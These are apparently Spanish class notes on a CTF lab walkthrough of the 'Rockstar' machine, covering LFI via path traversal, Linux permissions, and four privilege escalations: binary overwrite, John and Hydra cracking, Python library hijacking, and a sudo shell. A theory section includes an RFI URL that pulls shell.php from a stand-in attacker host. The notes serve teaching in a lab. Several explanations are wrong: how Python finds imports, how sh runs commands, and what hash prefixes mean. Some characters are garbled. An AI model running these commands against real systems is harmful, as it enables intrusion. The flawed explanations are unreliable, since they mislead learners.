## ① Repaso de la sesión anterior

### Fuzzing de parámetros y LFI

Cuando encontramos un fichero PHP en una enumeración de directorios, la pregunta correcta no es qué hace la página, sino **qué parámetros acepta**. Un fichero PHP interactúa con el backend, por lo que los parámetros que le enviamos pueden desencadenar comportamientos no documentados.

> [!important] Regla clave
> El fuzzing de parámetros **no tiene sentido en HTML** porque HTML es un lenguaje de front que nunca llega al servidor. Solo tiene sentido en ficheros que interactúen con el backend: PHP, .NET, JavaScript, Java, Python.

**Proceso de la sesión anterior:**

```
1. Enumerar directorios con dirsearch (extensiones: -x php,html,txt,py)
2. Encontrar index.php y db.php
3. Crear fuzzer en Python con Claude
4. Detectar parámetro "backdoor" en index.php
5. Pasar valor db.php → obtener credenciales: usuario shark
```

### Path Traversal y Local File Inclusion

El parámetro backdoor era vulnerable a **path traversal**: en lugar de db.php, se puede pasar `../../../../etc/passwd`, navegando hacia atrás en el árbol de directorios hasta la raíz y leyendo ficheros arbitrarios del sistema.

**¿Por qué funciona?** El código PHP tiene una función `file_open()` o equivalente que acepta una variable de usuario sin sanitizar, permitiendo leer cualquier fichero al que tenga acceso el proceso web.

> [!tip] Regla práctica
> El número de `../` no tiene límite superior efectivo. Una vez se supera la profundidad real del árbol, el sistema se queda en la raíz. Por eso se ponen **nueve o más combinaciones** `../`: garantiza llegar a la raíz independientemente de dónde esté el fichero PHP.

## ② Permisos en Linux €” tabla de referencia

Antes de entrar en la escalada, es imprescindible entender los permisos.

### Estructura del listado largo (ls -la)

```
Tipo Owner Group Others
 d rwx rwx rwx
 - rw- r-- r--
 s rwx rwx rwx
```

| Primer carácter | Significado |
|----------------|-------------|
| `-` | Fichero |
| `d` | Directorio |
| `s` | SUID (ejecutable como propietario) |
| `l` | Enlace simbólico |

### Pesos binarios de cada permiso

| Posición | Permiso | Valor | Descripción |
|----------|---------|-------|-------------|
| 0 | r (read) | 4 | Lectura |
| 1 | w (write) | 2 | Escritura |
| 2 | x (execute) | 1 | Ejecución |

### Las 8 combinaciones posibles (por trío)

| Octal | Binario | Permisos | Significado |
|-------|---------|----------|-------------|
| 0 | 000 | `---` | Ningún permiso |
| 1 | 001 | `--x` | Solo ejecución |
| 2 | 010 | `-w-` | Solo escritura |
| 3 | 011 | `-wx` | Escritura y ejecución |
| 4 | 100 | `r--` | Solo lectura |
| 5 | 101 | `r-x` | Lectura y ejecución |
| 6 | 110 | `rw-` | Lectura y escritura |
| 7 | 111 | `rwx` | Todos los permisos |

### Ejemplos de chmod

```bash
chmod 755 fichero # rwx r-x r-x (owner: todo, grupo/resto: lectura+ejecución)
chmod 777 fichero # rwx rwx rwx ( ¡MALA PRÁCTICA! todos los permisos para todos)
chmod 644 fichero # rw- r-- r-- (owner: lectura+escritura, resto: solo lectura)
```

> [!important] Idea clave para escalada
> Si un usuario tiene permiso de **escritura** sobre un fichero que puede **ejecutar suplantando a otro usuario** (via `sudo -l`), tiene **escalada de privilegios garantizada**. Escritura + ejecución delegada = control total del proceso.

```bash

pwd # ¿Dónde estoy?
uname -a # Versión del kernel (para buscar CVEs de escalada)
```

> [!note] Sobre el kernel
> Con la cantidad de vulnerabilidades 0-day de escalada de privilegios en Linux que están saliendo, la versión del kernel puede ser una vía de escalada. En este caso la máquina era reciente y parcheada, por lo que la vía de kernel no era aplicable.

### Lectura de /etc/passwd

```bash
# Mediante el LFI (path traversal en el parámetro backdoor)

```

**Resultado:** Se identifican los usuarios con sesión bash activa:

## ④ Primera escalada: modificación de ejecutable (shark → vvbered)

### Identificación del vector

```bash
sudo -l
# Resultado: shark puede ejecutar /home/shark/bof como vvbered
```

### Análisis del ejecutable

```bash
ls -la bof
# Propietario: shark (tiene permisos de escritura)

file bof
# ELF 32-bit LSB executable (compilado a código máquina)

cat bof
# Contenido ilegible (está compilado, no es texto)

./bof
# Respuesta: "overflow me" (sugiere buffer overflow)
```

> [!note] El buffer overflow no es necesario
> Aunque el ejecutable sugiere un buffer overflow como vector previsto, la técnica más simple es **modificar el contenido del fichero** directamente.

### Explotación

```bash
# shark es propietario del fichero → tiene permiso de escritura
# Puede reemplazar el contenido del ejecutable

echo bash > bof
# Ahora bof contiene "bash" en lugar del ejecutable original

sudo -u vvbered ./bof
# Ejecuta "bash" como vvbered → obtiene shell de vvbered
```

**Resultado:** Shell como vvbered.

> [!important] Concepto clave
> No hace falta entender qué hace un ejecutable para explotarlo. Si puedes **escribir** sobre él y **ejecutarlo** bajo otro usuario, sustituye su contenido por `bash` y obtén la shell directamente.

## ⑤ Segunda escalada: fuerza bruta controlada con Hydra (vvbered → lusei)

### Descubrimiento del fichero

```bash
ls -la /home/vvbered/
# Aparece rubiales.zip (propiedad de root, vvbered tiene permisos de lectura)
```

### Extracción del hash del ZIP

```bash
# Descargar el fichero a máquina local (python3 -m http.server)
zip2john rubiales.zip > hash.txt

# Resultado: nos muestra que contiene un fichero password.txt
# y el hash de la contraseña del ZIP
```

> [!note] Identificación de hashes
> El hash tiene un formato `$algo$...` que especifica el tipo. Blowfish es `$2$`, NTLMv2 es `$3$`. Identificar el tipo es crucial para elegir la herramienta correcta de cracking.

### Cracking del hash con John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Resultado: contraseña "princess"
```

### Descompresión del ZIP

```bash
unzip rubiales.zip
# Introducir contraseña: princess

cat passwords.txt
# Lista de 13 contraseñas
```

### Fuerza bruta con Hydra

```bash
# Crear listado de usuarios (del /etc/passwd)
vi users.txt
# root, shark, vvbered, lusei, username3

# Fuerza bruta sobre SSH
hydra -L users.txt -P passwords.txt ssh://10.0.2.9

# Resultado: lusei tiene la contraseña "..."
```

> [!important] Cuándo justificar la fuerza bruta
> Solo es justificable cuando el espacio de búsqueda es **fino, conocido y pequeño**. 4 usuarios Ã— 13 contraseñas = 52 combinaciones máximo. No es lo mismo que probar RockYou con 14 millones de contraseñas.

### Conexión SSH como lusei

```bash
ssh lusei@10.0.2.9
# Introducir contraseña obtenida
```

## ⑥ Tercera escalada: library hijacking (lusei → username3)

### Identificación del vector

```bash
sudo -l
# Resultado: lusei puede ejecutar rubiales.py como username3
```

### Análisis del script

```bash
cat rubiales.py
```

```python
import psutil

def printVirtualMemory():
 vm = psutil.virtual_memory()
 print(f"Name: {vm}")

printVirtualMemory()
```

> [!note] Lectura de código
> No hace falta ser programador, pero sí entender lo mínimo. El script importa la librería `psutil` y ejecuta una función de memoria virtual.

### Concepto: PATH y búsqueda de librerías

Cada usuario tiene un `$PATH` propio. Cuando ejecutas un comando o un script importa una librería, el sistema busca en las rutas del PATH **en orden**:

```bash
echo $PATH
# /home/lusei/.local/bin:/usr/local/bin:/usr/bin:/bin
```

**La primera ruta que aparece es `/home/lusei/.local/bin`**. Si ahí hay un fichero con el mismo nombre que la librería que se busca, se ejecuta ese en lugar de la librería real.

### Explotación: Library Hijacking

```bash
# Crear fichero malicioso psutil.py en la primera ruta del PATH
vi /home/lusei/.local/bin/psutil.py
```

```python
import os
os.system("bash")
```

```bash
# Ejecutar rubiales.py como username3
sudo -u username3 /usr/bin/python3 /home/lusei/rubiales.py
```

**¿Qué pasa?**
1. Python ejecuta rubiales.py como username3
2. rubiales.py hace `import psutil`
3. Python busca psutil.py en el PATH de lusei
4. Encuentra el fichero malicioso **antes** que la librería real
5. Ejecuta `os.system("bash")` con privilegios de username3

**Resultado:** Shell como username3.

> [!important] Concepto clave
> Cuando un script importa una librería **por nombre relativo** (no ruta absoluta), es vulnerable a library hijacking. Si el atacante controla algún directorio que aparezca antes en el path de búsqueda, puede sustituir cualquier librería por código propio.

### Alternativa de Manu: modificación directa del script

```bash
# Como lusei tiene permisos de escritura sobre rubiales.py:
mv rubiales.py algo.py

# Crear nuevo rubiales.py con shell
echo 'import os' > rubiales.py
echo 'os.system("bash")' >> rubiales.py

# Ejecutar como username3
sudo -u username3 /usr/bin/python3 /home/lusei/rubiales.py
```

**Resultado:** Shell como username3 (misma resultado, diferente técnica).

## ⑦ Cuarta escalada: ejecución de shell alternativa (username3 → root)

### Identificación del vector

```bash
sudo -l
# Resultado: username3 puede ejecutar /usr/bin/sh como root
```

### Diferencia entre sh y bash

```bash
# sh es más primitiva que bash
# Para ejecutar comandos en sh se usa exec("comando")

exec("id")
# Resultado: uid=0(root) → ¡SOMOS ROOT!
```

> [!note] No todas las shells son iguales
> - **bash**: shell estándar, comandos conocidos
> - **sh**: shell primitiva, comandos diferentes
> - **bsh**: basada en Java, usa `exec()` para ejecutar comandos
> - Cada shell tiene su propia sintaxis

### Alternativa con bin/bash

```bash
# Si sudo -l muestra /usr/bin/bash en lugar de /usr/bin/sh
sudo /usr/bin/bash
# Directamente root
```

## ⑧ Teoría: Path Traversal, LFI y RFI

### Path Traversal

Técnica para navegar fuera del directorio previsto usando secuencias `../`:

```
http://target.com/app?file=../../../../etc/passwd
```

- Cuando un parámetro acepta un nombre de fichero y **no sanitiza** estas secuencias, el atacante puede salir del directorio raíz de la aplicación
- El número de `../` no tiene límite superior efectivo (una vez en la raíz, no puede retroceder más)
- Práctica estándar: poner **nueve o más** `../` para garantizar llegar a la raíz

### Local File Inclusion (LFI)

Consecuencia del path traversal: el código PHP **lee o ejecuta** un fichero local que no debería ser accesible desde la aplicación web.

```php
// Código vulnerable
<?php
$file = $_GET['file'];
include($file); // Sin sanitizar → LFI
?>
```

**Mitigación:** Usar rutas absolutas hardcodeadas, no variables de usuario.

### Remote File Inclusion (RFI)

Más peligroso y más raro: el parámetro vulnerable acepta una **URL**, y el servidor hace una petición HTTP a esa URL y ejecuta o incluye el resultado.

```php
// Código vulnerable a RFI
<?php
$image = $_GET['image'];
include($image); // Si acepta URLs → RFI
?>
```

**Explotación:**

```
http://target.com/app?image=http://atacante.com/shell.php
```

- El servidor descarga shell.php desde el atacante y lo ejecuta
- **RCE completo** sin necesidad de subir ningún fichero al servidor objetivo
- La mitigación es no permitir que parámetros controlados por el usuario sean pasados a funciones de lectura de ficheros o URLs

> [!important] Resumen visual
> ```
> Path Traversal → navegar entre directorios
> →“
> LFI → leer ficheros locales no autorizados
> →“
> RFI → incluir y ejecutar ficheros remotos (¡RCE!)
> ```

## ⑩ Recapitulación integrada

Esta sesión completa el ciclo de explotación de Rockstar desde las credenciales iniciales hasta root, pasando por **cuatro movimientos laterales con técnicas distintas**:

1. **Modificación de ejecutable**: si puedes escribir sobre un fichero que ejecutas como otro usuario, reemplázalo por bash
2. **Fuerza bruta controlada**: cuando tienes un diccionario pequeño y conocido, Hydra es rápido y efectivo
3. **Library hijacking**: si un script importa librerías por nombre relativo, puedes sustituirlas en tu PATH
4. **Shell alternativa**: no todas las shells son iguales; aprende a ejecutar comandos en sh, bsh y bash

> [!note] Conexión
> Una máquina con múltiples usuarios no se escala de golpe: se analiza el `sudo -l` de cada usuario, se busca el eslabón más débil de la cadena y se salta de uno en uno. Cada usuario es una puerta diferente con una técnica diferente.
